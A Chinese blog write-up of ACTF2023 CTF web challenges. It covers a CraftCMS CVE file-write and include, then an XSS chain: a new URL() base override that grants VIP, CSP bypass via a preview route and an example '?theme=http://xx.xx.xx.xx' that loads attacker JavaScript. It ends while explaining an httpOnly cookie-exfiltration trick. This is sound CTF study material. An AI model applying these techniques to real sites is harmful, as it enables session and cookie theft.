<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="Squirt1e"><meta name="renderer" content="webkit"><meta name="copyright" content="Squirt1e"><meta name="keywords" content="Squirt1e's blog"><meta name="description" content="一名网络安全从业人员的博客"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>ACTF2023-web题解 · Squirt1e's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">Squirt1e</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="http://114.67.236.137/pic/5634a4a770a0497be3f36bdc068c6f7.jpg" target="_black">美</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Squirt1e's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">ACTF2023-web题解</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2023-10-31</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="CTF"> CTF</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="XSS"> XSS</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="SSTI"> SSTI</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="验证码逻辑漏洞"> 验证码逻辑漏洞</a></span></div><div class="post-intro-read"><span> Word count: <span class="post-count">3.5k</span> | Reading time: <span class="post-count">17</span>min</span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><p>这次比赛题非常有意思，甚至可以用猥琐两个字形容。</p>
<p><code>web</code>题是和<code>kkkl@chamd5</code>师傅一起做的，很多思路都是他想出来的。</p>
<h4 id="craftcms"><a href="#craftcms" class="headerlink" title="craftcms"></a>craftcms</h4><p>之前爆出过<code>cve</code>，参考这篇：</p>
<p><a target="_blank" rel="noopener" href="http://www.bmth666.cn/2023/09/26/CVE-2023-41892-CraftCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://www.bmth666.cn/2023/09/26/CVE-2023-41892-CraftCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p>
<p>使用第二种<code>trick</code>打日志包含会被检测到，而使用第三种方法<code>imagemagick</code>扩展写马应该是没有权限，写不进去<code>web</code>目录。</p>
<p>考虑第一次直接复制里面的报文打就行，往<code>/tmp</code>下写文件。</p>
<p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682144239.jpg" alt="1698682144239"></p>
<p>随后文件包含即可。</p>
<p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682170209.jpg" alt="1698682170209"></p>
<h4 id="easy-latex"><a href="#easy-latex" class="headerlink" title="easy latex"></a>easy latex</h4><p>这题看上去是要<code>XSS</code>。大体看一遍逻辑发现<code>theme</code>是可控的，并且渲染的时候是通过<code>latex-js</code>来远程加载<code>theme</code>，利用点估计就是通过可控的<code>theme</code>进行<code>xss</code>。</p>
<p>一开始看错了，还以为是什么<code>md5</code>弱类型绕过，仔细一看就是把账号<code>md5</code>之后当作密码就能登陆了。</p>
<pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> <span class="token punctuation">{</span> username<span class="token punctuation">,</span> password <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">!=</span> password<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> msg<span class="token punctuation">:</span> <span class="token string">'login failed'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">let</span> token <span class="token operator">=</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">{</span> username<span class="token punctuation">,</span> isVip<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
    res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>
    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="成为vip"><a href="#成为vip" class="headerlink" title="成为vip"></a>成为vip</h5><p>既然要想办法利用<code>theme</code>那么肯定要成为<code>vip</code>了。这里<code>url</code>返回一个<code>ok</code>就可以成为<code>vip</code>了。比较奇怪的是他是用<code>new URL(username, vip_url)</code>作为<code>url</code>请求访问的，正常来说直接格式化字符串就好了，并且这个<code>username</code>在前面，当时就觉得比较可疑。</p>
<pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/vip'</span><span class="token punctuation">,</span> auth<span class="token punctuation">,</span><span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> session <span class="token operator">=</span> req<span class="token punctuation">.</span>session
    <span class="token keyword">let</span> username <span class="token operator">=</span> session<span class="token punctuation">.</span>username
    <span class="token keyword">let</span> <span class="token punctuation">{</span> code <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body
    <span class="token keyword">let</span> vip_url <span class="token operator">=</span> VIP_URL
    <span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> vip_url<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        method<span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
        headers<span class="token punctuation">:</span> <span class="token punctuation">{</span>
            Cookie<span class="token punctuation">:</span> Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span>k<span class="token punctuation">,</span> v<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>k<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>v<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'; '</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        body<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span> code <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'ok'</span> <span class="token operator">==</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">{</span> username<span class="token punctuation">,</span> isVip<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Congratulation! You are VIP now.'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>具体看<code>URL()</code>的逻辑或者本地去调试都很容易发现：只要第一个参数是个完整的<code>http url</code>就会把第二个参数无视掉。因此自己写个返回<code>ok</code>的网页就能成为<code>vip</code>了。</p>
<p>以这个恶意<code>url</code>为用户名登陆即可成为<code>vip</code>。</p>
<p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20231031001103195.png" alt="image-20231031001103195"></p>
<h5 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h5><p><code>XSS</code>这一步就有点恶心了。其实这里已经看到了<code>id</code>是可控的，不一定非要访问<code>/note</code>，但此时光想着怎么打<code>note.html</code>的<code>xss</code>了。</p>
<pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/share/:id'</span><span class="token punctuation">,</span> reportLimiter<span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span> id <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>params
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>id<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'no note id specified'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token template-string"><span class="token string">`http://localhost:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>PORT<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/note/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
        <span class="token keyword">await</span> <span class="token function">visit</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'done'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'something error'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>因为<code>/note</code>这里是要求是<code>vip</code>才能传<code>theme</code>，这里就进入<code>ctf</code>的思维定式了（既然这个路由要成为<code>vip</code>才能设置主题那么肯定有用），但是看了眼<code>note.html</code>有比较严格的<code>CSP</code>限制。这里和队友想了好久，其中发现了两种方法可以打<code>alert</code>，我的方法比较答辩，就是控制<code>host</code>头赋值给<code>CSP</code>就能打本地<code>alert</code>，但实际上连<code>bot</code>都打不了，除非除非是有个<code>CRLF</code>。</p>
<p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682299128.jpg" alt="1698682299128"></p>
<p>队友<code>kkkl</code>想到的方法是更通用的，因为<code>note.html</code>的<code>CSP</code>引入了<code>jsdelivr</code>，这是个可以代理<code>github</code>的<code>cdn</code>，因此只要把<code>github</code>中的恶意脚本通过<a target="_blank" rel="noopener" href="https://www.jsdelivr.com/github%E4%BB%A3%E7%90%86%E5%B0%B1%E8%83%BD%E7%BB%95%E8%BF%87%60CSP%60%E4%BA%86%EF%BC%8C%E4%BD%86%E5%8F%AF%E6%83%9C%E7%9A%84%E6%98%AF%E8%BF%99%E7%A7%8D%E6%96%B9%E6%B3%95%E5%9C%A8%E5%90%8E%E7%BB%AD%E4%B9%9F%E6%A0%B9%E6%9C%AC%E4%B8%8D%E5%8F%AF%E8%83%BD%E7%BB%95%E8%BF%87%60http">https://www.jsdelivr.com/github代理就能绕过`CSP`了，但可惜的是这种方法在后续也根本不可能绕过`http</a> only&#96;。</p>
<pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/note'</span><span class="token punctuation">,</span> auth<span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> <span class="token punctuation">{</span> tex<span class="token punctuation">,</span> theme <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>tex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'empty tex'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>theme <span class="token operator">||</span> <span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isVip<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        theme <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">const</span> id <span class="token operator">=</span> notes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span> tex<span class="token punctuation">,</span> theme <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> msg <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>theme <span class="token operator">||</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isVip<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">''</span> <span class="token punctuation">:</span> <span class="token string">'Be VIP to enable theme setting!'</span>
    msg <span class="token operator">+</span><span class="token operator">=</span> <span class="token template-string"><span class="token string">`\nYour note link: http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>host<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/note/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span>
    msg <span class="token operator">+</span><span class="token operator">=</span> <span class="token template-string"><span class="token string">`\nShare it via http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>host<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/share/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>但后来想到了<code>/preview.html</code>也是可以请求加载指定的<code>theme</code>的，并且没有<code>CSP</code>，再结合前面提到的<code>id</code>是可控的就能完美利用了。</p>
<pre class="line-numbers language-html"><code class="language-html">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mt-4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>latex-js</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tex<span class="token punctuation">"</span></span> <span class="token attr-name">baseURL</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%<span class="token punctuation">=</span> base %<span class="token punctuation">></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>&lt;%= tex %><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>latex-js</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>能够请求自定义的<code>theme</code>是因为<code>/preview</code>路由下面也是通过<code>new URL</code>这种错误的处理方式进行<code>fetch</code>的，<code>theme</code>可控所以就可以随便加载我们自定义的<code>js</code>了，最关键的是这个页面<strong>没有CSP限制</strong>。</p>
<pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/preview'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> <span class="token punctuation">{</span> tex<span class="token punctuation">,</span> theme <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>tex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        tex <span class="token operator">=</span> <span class="token string">'Today is \\today.'</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">const</span> nonce <span class="token operator">=</span> <span class="token function">getNonce</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> base <span class="token operator">=</span> <span class="token string">'https://cdn.jsdelivr.net/npm/latex.js/dist/'</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>theme<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        base <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>theme<span class="token punctuation">,</span> <span class="token template-string"><span class="token string">`http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>host<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/theme/`</span></span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/'</span>
    <span class="token punctuation">}</span>
    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'preview.html'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> tex<span class="token punctuation">,</span> nonce<span class="token punctuation">,</span> base <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里请求的<code>js</code>是需要注意一下的，比如你传参<code>?theme=http://xx.xx.xx.xx</code>，那么他请求加载的<code>js</code>路径是<code>http://xx.xx.xx.xx/js/base.js</code>。</p>
<h5 id="绕过http-only"><a href="#绕过http-only" class="headerlink" title="绕过http only"></a>绕过http only</h5><p><code>bot</code>的逻辑是很经典的限制了<code>domain</code>和<code>http only</code>，在队内月赛&#x2F;升级赛遇到无数次这种恶心的东西。</p>
<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> visit <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`start: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>
    <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        headless<span class="token punctuation">:</span> <span class="token string">'new'</span><span class="token punctuation">,</span>
        executablePath<span class="token punctuation">:</span> puppeteer<span class="token punctuation">.</span><span class="token function">executablePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        args<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>

    <span class="token keyword">const</span> ctx <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">createIncognitoBrowserContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span><span class="token punctuation">{</span>
        <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> ctx<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setCookie</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            name<span class="token punctuation">:</span> <span class="token string">'flag'</span><span class="token punctuation">,</span>
            value<span class="token punctuation">:</span> FLAG<span class="token punctuation">,</span>
            domain<span class="token punctuation">:</span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>APP_HOST<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>APP_PORT<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">,</span>
            httpOnly<span class="token punctuation">:</span> <span class="token boolean">true</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span>timeout<span class="token punctuation">:</span> <span class="token number">5000</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span>
        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">await</span> ctx<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`done: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

module<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>visit <span class="token operator">=</span> visit
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>http only</code>只限制了<code>js</code>层面获取<code>cookie</code>，但是代码层面是管不到的。而<code>domain</code>限制了<code>cookie</code>的有效域，因此只能想办法找个<code>app.js</code>中的路由回显<code>cookie</code>了。很容易就想到了<code>vip</code>路由，这里会带着<code>cookie</code>访问<code>url</code>。</p>
